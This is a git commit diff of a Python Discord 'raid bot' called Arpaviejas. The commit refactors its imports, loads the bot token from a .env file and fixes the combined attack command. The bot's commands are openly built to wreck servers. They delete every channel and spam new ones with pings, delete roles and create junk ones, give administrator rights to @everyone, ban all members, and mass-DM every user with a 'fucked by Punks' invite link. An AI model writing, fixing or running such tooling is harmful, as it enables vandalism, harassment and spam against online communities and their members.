d40c323b5208d57dcec60f909138378911d49493
TheophileDiot <theophile.diot900@gmail.com>
2021-08-04 10:22:00 +0200

    making some improvements and optimisations + adding dotenv

--- Arpaviejas.py
+++ Arpaviejas.py
@@ -1,13 +1,24 @@
 import time
 import asyncio
-import discord
-from discord.ext import commands
+from itertools import cycle
+from dotenv import load_dotenv
+from os import path, getenv
+
+from discord import Intents, Permissions, Activity, ActivityType, Embed, Role
+from discord.ext.commands import Bot
+from discord.ext.tasks import loop
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-intents = discord.Intents.default()
+load_dotenv(path.join('.', '.env'))  # Load data from the .env file
+
+intents = Intents.default()
 intents.members = True
 # Intents are important for this, do not touch anything here.
-client = commands.Bot(command_prefix="!", intents=intents)
+client = Bot(command_prefix="!", intents=intents, help_command=None)
+client_status = cycle([  # Put the custom status of the bot in this list, separated by quotes and ,
+    Activity(type=ActivityType.listening,
+             name="Customize your own status here"),
+])
 
 
 @client.event
@@ -22,18 +33,11 @@ async def on_ready():  # Every time that the bots turns on, will show this Ascii
                                                                                                     Raidbot by: Crowley
     """
     print(anarchy)
-    client_status = [  # Put the custom status of the bot in this list, separated by quotes and ,
-        "Customize your own status here",
-    ]
-    while True:
-        for bot_status in client_status:
-            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=bot_status))
-            # In this case, the bot will change the status every two minutes, change the time (In seconds)
-            await asyncio.sleep(120)
+    change_status.start()
 
 
 def administrator_permissions():
-    permissions = discord.Permissions()
+    permissions = Permissions()
     permissions.update(administrator=True)
     return permissions
 
@@ -50,39 +54,33 @@ async def on_guild_channel_create(channel):
             y += 1
 
 
+@loop(minutes=2)
+async def change_status():
+    _activity = next(client_status)
+    await client.change_presence(activity=_activity)
+
+
 # Help menu with the default name of the commands, it's up to you change the names and adjust this crap.
-@client.command()
-async def ayuda(ctx):
+@client.command(name="ayuda", description="Menú de ayuda del bot.")
+async def ayuda_command(ctx):
     user = ctx.message.author
-    embed = discord.Embed(
+    embed = Embed(
         title="Command list of Arpaviejas",
         description="Detailed description about what this bot can do at the moment",
         colour=0xebe300
     )
-    embed.add_field(
-        name="!ayuda", value="Menú de ayuda del bot.", inline=False)
-    embed.add_field(name="!eskorbuto", value="Changes the name and the icon of the server, also deletes all the channels and starts to make spam creating new channels with pings.", inline=True)
-    embed.add_field(
-        name="!kaotiko", value="This command deletes all the roles of the server above the bot's role and creates 50 new roles.", inline=False)
-    embed.add_field(
-        name="!herejia", value="We must have equity, so this shit will give Admin privileges to the @everyone role.", inline=True)
-    embed.add_field(name="!panda", value="If you're an oppresor and son of a bitch, this crap will give you an special role with privileges. **WARNING: OTHER USERS CAN USE THIS, UNLESS YOU ADD AN EQUALITY CHECK TO CONFIRM YOUR USER ID.**", inline=False)
-    embed.add_field(
-        name="!flema", value="Do you want to get the invite of the bot and take a look to the bad practices of the creator?, use this command.", inline=True)
-    embed.add_field(name="!glorificar",
-                    value="type !glorificar + role-name to give admin privileges to some role.", inline=False)
-    embed.add_field(name="!millencolin", value="This command combines !eskorbuto, !kaotiko and !herejia at the same time, use this crap if you value your time. (Yeah sure, value your time raiding discord servers)", inline=True)
-    embed.add_field(name="!elektroduentes",
-                    value="Works for ban all users, has some bugs due the Discord rate limit", inline=False)
-    embed.add_field(
-        name="!dazepunk", value="This will send a single DM Message to all the users in the server, except the command author.", inline=True)
-    await user.send(embed=embed)
+    x = 0
+    for command in client.all_commands.keys():
+        command = client.all_commands[command]
+        embed.add_field(name=f"{client.command_prefix}{command.name}",
+                        value=command.description, inline=bool(x % 2))
+        x += 1
+    await ctx.send(embed=embed)
+
 
 # Eskorbuto Command, if you want to use a custom image, just put the document in the same folder.
-
-
-@client.command()
-async def eskorbuto(ctx):
+@client.command(name="eskorbuto", description="Changes the name and the icon of the server, also deletes all the channels and starts to make spam creating new channels with pings.")
+async def eskorbuto_command(ctx):
     # Once you got the image that you want to use, just change the name of the file and the extension if needed, must be on the same folder of the bot file, but you can put a full path to image file.
     with open('anarchism.jpg', 'rb') as f:
         icon = f.read()
@@ -101,8 +99,8 @@ async def eskorbuto(ctx):
         x += 1
 
 
-@client.command()
-async def kaotiko(ctx):
+@client.command(name="kaotiko", description="This command deletes all the roles of the server above the bot's role and creates 50 new roles.")
+async def kaotiko_command(ctx):
     for guild in client.guilds:
         for roles in guild.roles:
             # Bot tries to remove his own role for some reason, so i put this, change the Arpaviejas name to your bot name.
@@ -119,31 +117,30 @@ async def kaotiko(ctx):
         z += 1
 
 
-@client.command()
-async def herejia(ctx):
+@client.command(name="herejia", description="We must have equity, so this shit will give Admin privileges to the @everyone role.")
+async def herejia_command(ctx):
     for guild in client.guilds:
         for role in guild.roles:
             if role.name == "@everyone":
                 await role.edit(reason=None, permissions=administrator_permissions())
 
+
 # The Panda command, you can change the Punk Role name and the colour, don't forgot to use "0x" before the Hex range
-
-
-@client.command()
-async def panda(ctx):
+@client.command(name="panda", description="If you're an oppresor and son of a bitch, this crap will give you an special role with privileges. **WARNING: OTHER USERS CAN USE THIS, UNLESS YOU ADD AN EQUALITY CHECK TO CONFIRM YOUR USER ID.**")
+async def panda_command(ctx):
     user = ctx.message.author
     role = await ctx.guild.create_role(name="Punk", colour=0xebe300, permissions=administrator_permissions())
     await user.add_roles(role)
 
 
-@client.command()
-async def flema(ctx):
+@client.command(name="flema", description="Do you want to get the invite of the bot and take a look to the bad practices of the creator?, use this command.")
+async def flema_command(ctx):
     user = ctx.message.author
     await user.send("Here's my invite:\nhttps://discord.com/oauth2/authorize?client_id=870548494082002944&scope=bot&permissions=8\nDo you want to take a look to the bad practices of the creator of this bot?, here's the official Github Repo:https://github.com/PuppetCrowley/Arpaviejas\n")
 
 
-@client.command()
-async def elektroduendes(ctx):
+@client.command(name="elektroduendes", description="Works for ban all users, has some bugs due the Discord rate limit")
+async def elektroduendes_command(ctx):
     for users in ctx.guild.members:
         # Bot won't ban you using this command, because the != is going to check if the users are different from the message.author (The person that puts the command).
         if users != ctx.message.author:
@@ -154,17 +151,17 @@ async def elektroduendes(ctx):
                     f"I can't ban {users}, Maybe i'm above of his role or he's the owner of the server.")
 
 
-@client.command()
-async def glorificar(ctx, role: discord.Role, *, reason=None):
+@client.command(name="glorificator", description="type !glorificar + role-name to give admin privileges to some role.")
+async def glorificar_command(ctx, role: Role, *, reason=None):
     try:
-        await role.edit(permissions=administrator_permissions())
+        await role.edit(permissions=administrator_permissions(), reason=reason)
     except:
         print(
             f"Error, i can't edit the role {role}, Maybe i'm above of this role or it's somehow protected.")
 
 
-@client.command()
-async def dazepunk(ctx):
+@client.command(name="dazepunk", description="This will send a single DM Message to all the users in the server, except the command author.")
+async def dazepunk_command(ctx):
     for users in ctx.guild.members:
         # The bot will not send you any DM with this command using this conditional.
         if users != ctx.message.author:
@@ -172,14 +169,13 @@ async def dazepunk(ctx):
                 await users.send(f"The server {ctx.guild.name} has been fucked by Punks:\nhttps://discord.gg/FhJydrmbTz")
             except:
                 print(
-                    f"Error, i can't send a message to the user {user}, maybe he locked the DM Access.")
+                    f"Error, i can't send a message to the user {users}, maybe he locked the DM Access.")
 
 
-@client.command()
-# There's some bugs in this command, sometimes, the bot will not end a task and automatically will start another option for some reason.
-async def millencolin(ctx):
-    eskorbuto(ctx)
-    kaotiko(ctx)
-    herejia(ctx)
+@client.command(name="millencolin", description="This command combines !eskorbuto, !kaotiko and !herejia at the same time, use this crap if you value your time. (Yeah sure, value your time raiding discord servers)")
+async def millencolin_command(ctx):
+    await eskorbuto_command(ctx)
+    await kaotiko_command(ctx)
+    await herejia_command(ctx)
 
-client.run("")  # Put your Bot Token here.
+client.run(getenv('BOT_TOKEN'))  # Put your Bot Token here.
